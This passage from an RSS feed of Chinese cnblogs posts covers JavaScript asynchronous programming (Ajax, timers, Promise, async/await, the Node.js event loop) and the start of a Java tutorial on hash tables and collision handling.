xhr.open(&quot;GET&quot;, url, false);    //同步方式请求 
xhr.open(&quot;GET&quot;, url, true);     //异步
xhr.send();&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;同步&lt;code&gt;Ajax&lt;/code&gt;请求：&lt;/p&gt;
&lt;p&gt;当请求开始发送时，&lt;code&gt;浏览器事件线程&lt;/code&gt;通知&lt;code&gt;主线程&lt;/code&gt;，让&lt;code&gt;Http线程&lt;/code&gt;发送数据请求，主线程收到请求之后，通知&lt;code&gt;Http线程&lt;/code&gt;发送请求，&lt;code&gt;Http线程&lt;/code&gt;收到&lt;code&gt;主线程&lt;/code&gt;通知之后就去请求数据，等待服务器响应，过了&lt;code&gt;N&lt;/code&gt;年之后，收到请求回来的数据，返回给&lt;code&gt;主线程&lt;/code&gt;数据已经请求完成，&lt;code&gt;主线程&lt;/code&gt;把结果返回给了&lt;code&gt;浏览器事件线程&lt;/code&gt;，去完成后续操作。&lt;/p&gt;
&lt;p&gt;异步&lt;code&gt;Ajax&lt;/code&gt;请求：&lt;/p&gt;
&lt;p&gt;当请求开始发送时，&lt;code&gt;浏览器事件线程&lt;/code&gt;通知，&lt;code&gt;浏览器事件线程&lt;/code&gt;通知&lt;code&gt;主线程&lt;/code&gt;，让&lt;code&gt;Http线程&lt;/code&gt;发送数据请求，主线程收到请求之后，通知&lt;code&gt;Http线程&lt;/code&gt;发送请求，&lt;code&gt;Http线程&lt;/code&gt;收到&lt;code&gt;主线程&lt;/code&gt;通知之后就去请求数据，并通知&lt;code&gt;主线程&lt;/code&gt;请求已经发送，&lt;code&gt;主进程&lt;/code&gt;通知&lt;code&gt;浏览器事件线程&lt;/code&gt;已经去请求数据，则&lt;br/&gt;&lt;code&gt;浏览器事件线程&lt;/code&gt;，只需要等待结果，并不影响其他工作。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;setInterval&amp;amp;setTimeout&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;setInterval&lt;/code&gt;与&lt;code&gt;setTimeout&lt;/code&gt;同属于异步方法，其异步是通过回调函数方式实现。其两者的区别则&lt;code&gt;setInterval&lt;/code&gt;会连续调用回调函数，则&lt;code&gt;setTimeout&lt;/code&gt;会延时调用回调函数只会执行一次。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;setInterval(() =&amp;gt; {
    alert(1)
},2000)
//  每隔2s弹出一次1
setTimeout(() =&amp;gt; {
    alert(2)
},2000)
//  进入页面后2s弹出2，则不会再次弹出&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;requestAnimationFarme&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;requestAnimationFrame&lt;/code&gt;字面意思就是去请求动画帧，在没有&lt;code&gt;API&lt;/code&gt;之前都是基于&lt;code&gt;setInterval&lt;/code&gt;，与&lt;code&gt;setInterval&lt;/code&gt;相比，&lt;code&gt;requestAnimationFrame&lt;/code&gt;最大的优势是由系统来决定回调函数的执行时机。具体一点讲，如果屏幕刷新率是&lt;code&gt;60Hz&lt;/code&gt;,那么回调函数就每&lt;code&gt;16.7ms&lt;/code&gt;被执行一次，如果刷新率是&lt;code&gt;75Hz&lt;/code&gt;，那么这个时间间隔就变成了&lt;code&gt;1000/75=13.3ms&lt;/code&gt;，换句话说就是，&lt;code&gt;requestAnimationFrame&lt;/code&gt;的步伐跟着系统的刷新步伐走。它能保证回调函数在屏幕每一次的刷新间隔中只被执行一次，这样就不会引起丢帧现象，也不会导致动画出现卡顿的问题。&lt;/p&gt;
&lt;p&gt;举个小例子：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;var progress = 0;
//回调函数
function render() {
    progress += 1; //修改图像的位置
    if (progress &amp;lt; 100) {
        //在动画没有结束前，递归渲染
        window.requestAnimationFrame(render);
    }
}
//第一帧渲染
window.requestAnimationFrame(render);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Object.observe - 观察者&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Object.observe&lt;/code&gt;是一个提供数据监视的&lt;code&gt;API&lt;/code&gt;，在&lt;code&gt;chrome&lt;/code&gt;中已经可以使用。是&lt;code&gt;ECMAScript 7&lt;/code&gt; 的一个提案规范，官方建议的是&lt;code&gt;谨慎使用&lt;/code&gt;级别，但是个人认为这个&lt;code&gt;API&lt;/code&gt;非常有用，例如可以对现在流行的&lt;code&gt;MVVM&lt;/code&gt;框架作一些简化和优化。虽然标准还没定，但是标准往往是滞后于实现的，只要是有用的东西，肯定会有越来越多的人去使用，越来越多的引擎会支持，最终促使标准的生成。从&lt;code&gt;observe&lt;/code&gt;字面意思就可以知道，这玩意儿就是用来做观察者模式之类。&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;var obj = {a: 1};
Object.observe(obj, output);
obj.b = 2;
obj.a = 2;
Object.defineProperties(obj, {a: { enumerable: false}}); //修改属性设定
delete obj.b;
function output(change) {
    console.log(1)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Promise&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Promise&lt;/code&gt;是对异步编程的一种抽象。它是一个代理对象，代表一个必须进行异步处理的函数返回的值或抛出的异常。也就是说&lt;code&gt;Promise&lt;/code&gt;对象代表了一个异步操作，可以将异步对象和回调函数脱离开来，通过&lt;code&gt;then&lt;/code&gt;方法在这个异步操作上面绑定回调函数。&lt;/p&gt;
&lt;p&gt;在Promise中最直观的例子就是&lt;code&gt;Promise.all&lt;/code&gt;统一去请求，返回结果。&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;var p1 = Promise.resolve(3);
var p2 = 42;
var p3 = new Promise(function(resolve, reject) {
  setTimeout(resolve, 100, 'foo');
});
Promise.all([p1, p2, p3]).then(function(values) {
  console.log(values);
});
// expected output: Array [3, 42, &quot;foo&quot;]&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Generator&amp;amp;Async/Await&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ES6&lt;/code&gt;的&lt;code&gt;Generator&lt;/code&gt;却给异步操作又提供了新的思路，马上就有人给出了如何用&lt;code&gt;Generator&lt;/code&gt;来更加优雅的处理异步操作。&lt;code&gt;Generator&lt;/code&gt;函数是协程在&lt;code&gt;ES6&lt;/code&gt;的实现，最大特点就是可以交出函数的执行权（即暂停执行）。整个&lt;code&gt;Generator&lt;/code&gt;函数就是一个封装的异步任务，或者说是异步任务的容器。异步操作需要暂停的地方，都用yield语句注明。&lt;code&gt;Generator&lt;/code&gt;函数的执行方法如下。&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;function * greneratorDome(){
    yield &quot;Hello&quot;;
    yield &quot;World&quot;;
    return &quot;Ending&quot;;
}
let grenDome = greneratorDome();
console.log(grenDome.next());
// {value: &quot;Hello&quot;, done: false}
console.log(grenDome.next());
// {value: &quot;World&quot;, done: false}
console.log(grenDome.next());
// {value: &quot;Ending&quot;, done: true}
console.log(grenDome.next());
// {value: undefined, done: true}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;粗略实现&lt;code&gt;Generator&lt;/code&gt;&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;function makeIterator(array) {
  var nextIndex = 0;
  return {
    next: function() {
      return nextIndex &amp;lt; array.length ?
        {value: array[nextIndex++], done: false} :
        {value: undefined, done: true};
    }
  };
}
var it = makeIterator(['a', 'b']);
it.next() // { value: &quot;a&quot;, done: false }
it.next() // { value: &quot;b&quot;, done: false }
it.next() // { value: undefined, done: true }&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Async/Await&lt;/code&gt;与&lt;code&gt;Generator&lt;/code&gt;类似，&lt;code&gt;Async/await&lt;/code&gt;是&lt;code&gt;Javascript&lt;/code&gt;编写异步程序的新方法。以往的异步方法无外乎回调函数和&lt;code&gt;Promise&lt;/code&gt;。但是&lt;code&gt;Async/await&lt;/code&gt;建立于Promise之上,个人理解是使用了&lt;code&gt;Generator&lt;/code&gt;函数做了语法糖。&lt;code&gt;async&lt;/code&gt;函数就是隧道尽头的亮光，很多人认为它是异步操作的终极解决方案。&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;function a(){
    return new Promise((resolve,reject) =&amp;gt; {
        console.log(&quot;a函数&quot;)
        resolve(&quot;a函数&quot;)
    })
}
function b (){
    return new Promise((resolve,reject) =&amp;gt; {
        console.log(&quot;b函数&quot;)
        resolve(&quot;b函数&quot;)
    })
}
async function dome (){
    let A = await a();
    let B = await b();
    return Promise.resolve([A,B]);
}
dome().then((res) =&amp;gt; {
    console.log(res);
});&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Node.js异步I/O&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当我们发起&lt;code&gt;IO&lt;/code&gt;请求时，调用的是各个不同平台的操作系统内部实现的线程池内的线程。这里的&lt;code&gt;IO&lt;/code&gt;请求可不仅仅是读写磁盘文件，在&lt;code&gt;*nix&lt;/code&gt;中，将计算机抽象了一层，磁盘文件、硬件、套接字等几乎所有计算机资源都被抽象为文件，常说的&lt;code&gt;IO&lt;/code&gt;请求就是抽象后的文件。完成&lt;code&gt;Node&lt;/code&gt;整个异步&lt;code&gt;IO&lt;/code&gt;环节的有事件循环、观察者、请求对象。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;事件循环机制&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;单线程就意味着，所有任务需要排队，前一个任务结束，才会执行后一个任务。如果前一个任务耗时很长，后一个任务就不得不一直等着。于是就有一个概念，任务队列。如果排队是因为计算量大，&lt;code&gt;CPU&lt;/code&gt;忙不过来，倒也算了，但是很多时候&lt;code&gt;CPU&lt;/code&gt;是闲着的，因为&lt;code&gt;IO&lt;/code&gt;设备（输入输出设备）很慢（比如&lt;code&gt;Ajax&lt;/code&gt;操作从网络读取数据），不得不等着结果出来，再往下执行。&lt;/p&gt;
&lt;p&gt;事件循环是&lt;code&gt;Node&lt;/code&gt;的自身执行模型，正是事件循环使得回调函数得以在&lt;code&gt;Node&lt;/code&gt;中大量的使用。在进程启动时&lt;code&gt;Node&lt;/code&gt;会创建一个&lt;code&gt;while(true)&lt;/code&gt;死循环，这个和&lt;code&gt;Netty&lt;/code&gt;也是一样的，每次执行循环体，都会完成一次&lt;code&gt;Tick&lt;/code&gt;。每个&lt;code&gt;Tick&lt;/code&gt;的过程就是查看是否有事件等待被处理。如果有，就取出事件及相关的回调函数，并执行关联的回调函数。如果不再有事件处理就退出进程。&lt;/p&gt;
&lt;img src=&quot;https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=3205663441,2452156941&amp;amp;fm=26&amp;amp;gp=0.jpg&quot;/&gt;&lt;p&gt;线程只会做一件事情，就是从事件队列里面取事件、执行事件，再取事件、再事件。当消息队列为空时，就会等待直到消息队列变成非空。而且主线程只有在将当前的消息执行完成后，才会去取下一个消息。这种机制就叫做事件循环机制，取一个消息并执行的过程叫做一次循环。&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;while(true) {
    var message = queue.get();
    execute(message);
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;我们可以把整个事件循环想象成一个事件队列，在进入事件队列时开始对事件进行弹出操作，直至事件为&lt;code&gt;0&lt;/code&gt;为止。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;process.nextTick&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;process.nextTick()&lt;/code&gt;方法可以在当前&quot;执行栈&quot;的尾部--&amp;gt;下一次&lt;code&gt;Event Loop&lt;/code&gt;（主线程读取&quot;任务队列&quot;）之前--&amp;gt;触发&lt;code&gt;process&lt;/code&gt;指定的回调函数。也就是说，它指定的任务总是发生在所有异步任务之前，当前主线程的末尾。（&lt;code&gt;nextTick&lt;/code&gt;虽然也会异步执行，但是不会给其他&lt;code&gt;io&lt;/code&gt;事件执行的任何机会）;&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;process.nextTick(function A() {
  console.log(1);
  process.nextTick(function B(){console.log(2);});
});
setTimeout(function C() {
  console.log(3');
}, 0);
// 1
// 2
// 3&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;异步过程的构成要素&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;异步函数实际上很快就调用完成了，但是后面还有工作线程执行异步任务，通知主线程，主线程调用回调函数等很多步骤。我们把整个过程叫做异步过程，异步函数的调用在整个异步过程中只是一小部分。&lt;/p&gt;
&lt;p&gt;一个异步过程的整个过程：主线程发一起一个异步请求，相应的工作线程接收请求并告知主线程已收到通知（异步函数返回）；主线程可以继续执行后面的代码，同时工作线程执行异步任务；工作线程完成工作后，通知主线程；主线程收到通知后，执行一定的动作（调用回调函数）。&lt;/p&gt;
&lt;p&gt;它可以叫做异步过程的发起函数，或者叫做异步任务注册函数。&lt;code&gt;args&lt;/code&gt;是这个函数需要的参数，&lt;code&gt;callbackFn&lt;/code&gt;（回调函数）也是这个函数的参数，但是它比较特殊所以单独列出来。所以，从主线程的角度看，一个异步过程包括下面两个要素：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;发起函数;&lt;/li&gt;
&lt;li&gt;回调函数callbackFn&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;它们都是主线程上调用的，其中注册函数用来发起异步过程，回调函数用来处理结果。&lt;/p&gt;
&lt;p&gt;举个具体的栗子：&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;setTimeout(function,1000);&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其中&lt;code&gt;setTimeout&lt;/code&gt;就是异步过程的发起函数，&lt;code&gt;function&lt;/code&gt;是回调函数。&lt;/p&gt;
&lt;p&gt;注：前面说得形式&lt;code&gt;A(args...,callbackFn)&lt;/code&gt;只是一种抽象的表示，并不代表回调函数一定要作为发起函数的参数，例如：&lt;/p&gt;
&lt;pre class=&quot;javascript&quot;&gt;
&lt;code&gt;var xhr = new XMLHttpRequest();
xhr.onreadystatechange = xxx;
xhr.open('GET'， url);
xhr.send();　　&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;总结&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;code&gt;JavaScript&lt;/code&gt;的异步编程模式不仅是一种趋势，而且是一种必要，因此作为&lt;code&gt;HTML5&lt;/code&gt;开发者是非常有必要掌握的。采用第三方的异步编程库和异步同步化的方法，会让代码结构相对简洁，便于维护，推荐开发人员掌握一二，提高团队开发效率。&lt;/p&gt;
</description>
<pubDate>Tue, 21 May 2019 15:09:00 +0000</pubDate>
<dc:creator>Aaron-攻城狮</dc:creator>
<og:description>一直以来都知道 是一门单线程语言，在笔试过程中不断的遇到一些输出结果的问题，考量的是对异步编程掌握情况。一般被问到异步的时候脑子里第一反应就是 ，`setTimseout JavaScript 回调地</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/aaron---blog/p/10903118.html</dc:identifier>
</item>
<item>
<title>java数据结构和算法09（哈希表） - java小新人</title>
<link>http://www.cnblogs.com/wyq1995/p/10890349.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wyq1995/p/10890349.html</guid>
<description>&lt;p&gt;　　树的结构说得差不多了，现在我们来说说一种数据结构叫做哈希表（hash table），哈希表有是干什么用的呢？我们知道树的操作的时间复杂度通常为O（logN），那有没有更快的数据结构？当然有，那就是哈希表；&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;1.哈希表简介&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　哈希表（hash table）是一种数据结构，提供很快速的插入和查找操作（有的时候甚至删除操作也是），时间复杂度为O(1)，对比时间复杂度就可以知道哈希表比树的效率快得多，并且哈希表的实现也相对容易，然而没有任何一种数据结构是完美的，哈希表也是；哈希表最大的缺陷就是基于数组，因为数组初始化的时候大小是确定的，数组创建后扩展起来比较困难；&lt;/p&gt;
&lt;p&gt;　　当哈希表装满了之后，就要把数据转移到一个更大的哈希表中，这会很费时间，而且哈希表不支持有顺序的遍历，因为从哈希表中遍历数据是随机的；所以我们使用哈希表的前提是：不需要有序的遍历数据，可以大概知道数据量的多少；满足这两点就可以用哈希表；&lt;/p&gt;
&lt;p&gt;　　那有人就要问了，说得这么厉害，哈希表到底是什么样子的啊？下面就随便说两个吧。。。&lt;/p&gt;
&lt;p&gt;　　很经典的例子就是英语字典，我们查字典的时候可以根据这个单词就可以找到第xxx页，在这里该单词和页数就对应起来了，这可以说是一个哈希表；&lt;/p&gt;
&lt;p&gt;　　再举个现实中的例子，在上学的时候每个人在学校里都会有一个学号，你这个人在学校中就对应这个学号，假如校长手上有一个记录全校学生的表，然后根据学号找一个学生时，就能很快锁定这个学生的姓名，性别，班级等信息；有没有想过假如没有学号的话，校长想找一个学生就只能根据姓名去找，可是同名同姓的人这么多，想找到目标学生不是一件容易的事。。。。。&lt;/p&gt;
&lt;p&gt;　　ok，在这里哈希表可以看作是校长手上的那个表（其实就是一个数组），我们根据我们要存的信息生成一个表中的位置的号码（在这里这个号码就是数组的下标），根据这个号码我们就知道该数据存在数组的哪个位置，然后将数据保存进去就可以了；假如有个大小为20的数组，我要存“aaa”,我们可以想个很厉害的办法将这个字符串变成一个比较小的数字，比如是10，那么就把这个字符串存到数组的第10个位置，这样做的好处就是下次如果要从哈希表中查询（或删除）“aaa”这个字符串时，只需要将“aaa”字符串算出那个号码10，然后直接去数组中第10个位置找一个看有没有这个字符串，是不是很简单啊！&lt;/p&gt;
&lt;p&gt;　　所以现在我们需要解决的就是想个很厉害的办法可以将字符串变成一个比较小的数字（这个过程叫做哈希化），还要保证这个数字不能超过数组的最大边界！&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;2 哈希化&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　哈希化就是想办法将我们要保存的数据对应一个数组下标，在数组的该位置下保存数据；我们可以把这个过程专业一点的说一下：把要保存的数据，通过哈希函数转化为对应的数组下标；现在我们的目标就是怎么编写一个哈希函数可以使得字符串变成数组下标；&lt;/p&gt;
&lt;p&gt;　　这里我们可以假设一个字符串t数组的大小为30，String[] str = new String[30];   要存“cats”这个单词，最容易想到的办法就是用ASCII码，但是由于ASCII码太多了不好记，于是我们可以自己设置一套规则，我就假设a到z分别对应1到26，外加空格对应0，现在一套最简陋的规则就出来了,我那么“cats”这个单词：c = 3,a = 1,t = 20,s = 19，现在“cats”有两种办法变成数组的下标；&lt;/p&gt;
&lt;p&gt;　　额外补充一下：假如我们要保存的字符串有50个，那么我们new的数组大小一定要是它的两倍大，即 new String[100];，后面会说到这个原因&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;2.1哈希函数实现一&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　怎么实现比较好呢？别想那么多，直接相加就好，3+1+20+19 = 43，这个时候就有个小问题，我们的数组的大小为30，也就是说数组下标最大值是29，而这里我们的数字为43，怎么将43变成29以内的数（包括29）呢？因为任何数除以30的余数只都在0-29之间，于是我们用43除以30拿到余数13，那么我们就把”cats“放到数组下标为13的位置,str[13] = &quot;cats&quot;;&lt;/p&gt;
&lt;p&gt;　　这种哈希函数的实现很容易，但是往往越容易的东西缺点就越大，最大的缺陷就是有很多单词变成数字是相同的，比如was，tin，give等100多个单词变成数字后都是43，然后我们恰巧添加单词的时候就是这些单词，现在问题来了，多个单词最后算出来的数组下标很大概率上是一样的，也就是数组一个位置要放多个数据，怎么解决这个问题呢？我们可以换一种哈希函数的实现来降低这个概率&lt;/p&gt;
&lt;p&gt;　　&lt;strong&gt;&lt;span&gt;2.2 哈希函数实现二&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;　　由2.1可以知道太多的单词变成数字的结果是一样的，那么我们就要想办法为每一个单词都对应一个独一无二的整数，然后用这个整数除以数组的大小取余数，就可以知道该单词在数组中的存放位置；&lt;/p&gt;
&lt;p&gt;　　于是啊，我们可以利用幂的连乘来得到这个独一无二的整数，比如“cats”用这种计算方法：3*27&lt;sup&gt;3&lt;/sup&gt;+1*27&lt;sup&gt;2&lt;/sup&gt;+20*27&lt;sup&gt;1&lt;/sup&gt;+19*27&lt;sup&gt;0&lt;/sup&gt;，有点类似二进制变成十进制，通过这个算法，可以得到一个独一无二的整数，其他的任何单词通过这种方法算出来的结果几乎是不可能相等的，有兴趣的可以试试；然后将这个计算结果除以30取余数，就可以得到一个数组的位置，然后将该字符串丢到里面即可；&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201905/1368608-20190520103041142-1996864430.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　不知道大家有没有发现这种方法的一个问题，因为数组的大小是一定的，而且我们是通过取余数来得到数组的位置，那么问题来了，即使是两个不相同的整数分别除以30，最后的余数是相等的；&lt;/p&gt;
&lt;p&gt;　　就比如有两个字符串通过幂的连乘最后得到32和62（当然我们这里肯定不会得到这两个整数，为了好理解随便拿两个数），虽然这两个数是独一无二的，但是除以30余数都为2，那么两个数据要保存到哈希表中肯定会有冲突，下后面我们来解决一下这个冲突；&lt;/p&gt;

&lt;p&gt;　　有个简单的哈希函数实现看一下（虽然还可以进行修改一下，但是这个已经差不多了）；&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201905/1368608-20190521192024032-525912526.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201905/1368608-20190521222710633-1714166036.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;3.冲突&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　冲突的原因就是两个独一无二的整数除以数组的大小，取余数是相等的，而数组中一个位置只能存一个数据，这就导致了冲突，解决冲突的办法有两种；&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;strong&gt;&lt;span&gt;.&lt;/span&gt;1 解决方法一（开放地址法）&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　还记得前面说过数组的大小要为实际数量的两倍吗？就是为了这个时候用的，假如一个单词已经放在了数组的第15个位置那里，另外一个单词本来也要放在第15的位置，由于这个位置已经被别人占了。那就放在数组的另外一个位置上，反正还有很多数组比较大，这种方式叫做------开放地址法&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;3.2 解决方法二（链地址法 ）&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　既然有两个数据都要放在数组的一个位置上，那就想办法把第二个数据连在第一个数据后面，通过第一个数据可以找到第二个数据，而数组中只保存第一个数据的地址；其实就是一句话，数组中每个位置放一个链表；&lt;/p&gt;
&lt;p&gt;　　这种方法的好处很明显，完美解决上述冲突，不需要用什么花里胡哨的操作；缺陷就是当链表太长了，我们要查询这个链表的最后面的数据，只能慢慢遍历这个链表，而我们知道，链表的优势是插入和删除，而对于查询这种操作是比较坑爹的，而我们前面用了红黑树这样的结构来完美解决链表的缺点；最后，我们就差不多想到了一个比较实用的方法：数组的每个位置都存放一个链表，当链表的节点很少的时候，那就用链表吧！但是当链表慢慢的变长，当节点数目到达一个界限的时候，我们就把这个链表变成一个红黑树，比较完美的方案，这也叫做------链地址法 &lt;/p&gt;
&lt;p&gt;　　顺便一提，jdk7的HashMap就是数组中放链表，即使链表很长也不会变红黑树；jdk8中的HashMap才增加了变红黑树这个操作&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;4.开放地址法&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　所谓的开放地址法就是：根据我们要保存的数据计算出来的数组下标的那个位置已经存放了数据，这个时候我们就要再找一个空位置，然后将要保存的数据丢进去即可，那么怎么找比较好呢？这里提供三种方式，线性探测，二次探测和再哈希法，下面就看看这三种方式到底是怎么工作的；&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;4.1 线程探测&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　看名字线性就知道是从前往后寻找空的位置，举个很简单的例子，当一个字符串经过运算对应于数组下标为52，然而此时52这个位置上已经有了数据，那么就尝试放到53的位置，假如53的位置也已经放了数据，那就放到54位置，就这样一直往后慢慢找，直到找到一个空的位置就把数据放进去；而此时找的次数越多，假如已经找到56的位置，那么从53到56这么多位置叫做填充序列，当填充序列很长的时候，我们就称为原始聚集，下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201905/1368608-20190520170721861-2062869760.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　这里填充序列的中有5个填充单元，我们也可以说步数为1，每次探测都是前进一步；我们可以知道当探测的次数越多的时候，说明聚集越严重，下一次再想添加到这个位置的数据的效率就越低；&lt;/p&gt;
&lt;p&gt;　　还有就是当哈希表填充得越满，效率也就越低，所以当哈希表快满了之后就要扩展，而java中数组是不能直接进行扩展的，需要再新建一个数组，然后想办法将这个哈希表中的数据复制到新的数组中，注意，这里不能直接复制，因为新的数组的容量和原来的数组不一样，那么原来哈希表中所有的数据必须要重新哈希化，然后放入到新的数组中，非常耗时....&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;4.2 二次探测&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　根据前面我们的线性探测可以知道，假如经过哈希函数计算出来的原始数组下标为x，那么线性探测的位置是x+1，x+2，x+3，x+4.....,；那么 进行二次探测找的位置就是x+1&lt;sup&gt;2&lt;/sup&gt;，x+2&lt;sup&gt;2&lt;/sup&gt;，x+3&lt;sup&gt;2&lt;/sup&gt;，x+4&lt;sup&gt;2&lt;/sup&gt;.....其实就是按照步数的平方进行探测看里面有没有数据，没有的话才放进去新的数据，二次探测可以防止聚集太长所导致的效率下降问题；&lt;/p&gt;
&lt;p&gt;　　对于二次探测来说，如果当前计算出来的位置为x，首先会探测x后面一个位置，如果这个位置有数据，那就多往后4个位置看有没有数据，假如还是有数据，那么二次探测可能会觉得你这个聚集特别长，于是这次跳得更远的位置，当前位置后面的16的位置等等，直到最后跳过整个数组， 这样可以避免一个一个的位置慢慢探测的底下效率，二次探测下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201905/1368608-20190520173539719-989075880.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　二次探测也有点问题，会导致二次聚集，那什么又是二次聚集呢？其实跟原始聚集差不多吧！比如184，302，420，544这几个整数都要放到哈希表中，而且这几个数经过哈希算法算出来的数组下标都为7，302需要以1步长进行探测，而420要先以1为步长，然后以4步长进行探测，而544要先以1为步长，然后以4为步长，最后以16步长进行探测，假如后面还有数据对应的数组下标为7，那么还是要重复这个步骤，而且是越来越长....这也是一种聚集，个人感觉从某种意义来说和原始聚集性质差不多吧！&lt;/p&gt;
&lt;p&gt;　   二次探测不常用，因为有更好的办法解决，就是再哈希法；&lt;/p&gt;
&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;4.3 再哈希法&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　用再哈希法可以消除原始聚集和二次聚集，那么什么是再哈希法呢？我们可以知道产生原始聚集和二次聚集的原因其实差不多，都是由于多个数据添加到哈希表中的同一个位置，然后根据步长一个一个位置的探测，直到找到一个空的位置，如果需要找的位置特别多，那么这就是聚集，添加的效率的就会大幅度降低； &lt;/p&gt;
&lt;p&gt;　　那么我们就要想一种方法即使多个数据要放在哈希表的同一个位置，但是不需要从头开始一个一个位置的探测，如果每个数据都可以产生一个独一无二的步长那不就好了么！然后直接根据这个步长探测该位置将数据丢进去就ok了；&lt;/p&gt;
&lt;p&gt;　　于是我们准备了两个哈希函数，一个哈希函数就是我们上面说到的可以产生对应的数组下标，另外一个哈希函数可以产生步长，其实就是多个数据放在同一个位置产发生冲突，就用这个哈希函数再次哈希化产生一个步长，根据这个步长进行探测就可以了，而不用每次都从第一个步长开始；比如下面就有一个产生步长的哈希函数，我们可以知道步长的范围是1-constant，注意步长不能为0，否则就原地踏步了。。。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1368608/201905/1368608-20190521102603631-1988865701.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　上图中，假如我们往哈希表中添加的数据是数字，那就直接将数据和数组大小取余得到数组下标，这里的key就是我们的数据，constant只要是小于数组容量的一个质数，随便什么都可以&lt;/p&gt;
